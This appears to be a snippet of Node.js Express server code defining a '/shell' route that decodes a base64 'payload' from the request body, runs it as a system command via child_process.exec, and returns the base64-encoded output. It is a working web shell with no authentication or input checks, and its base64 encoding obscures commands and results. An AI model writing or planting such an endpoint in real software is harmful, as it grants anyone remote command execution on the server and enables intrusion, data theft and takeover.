app.post('/shell' , (req, res) => {
  const { exec } = require("child_process");
  let cmd = Buffer.from(req.body['payload'], 'base64').toString()
  exec(cmd, (error, stdout, stderr) => {
    let return_val = Buffer.from(stdout).toString('base64')
    res.setHeader('Content-type','text/plain')
    res.send(return_val)
});
});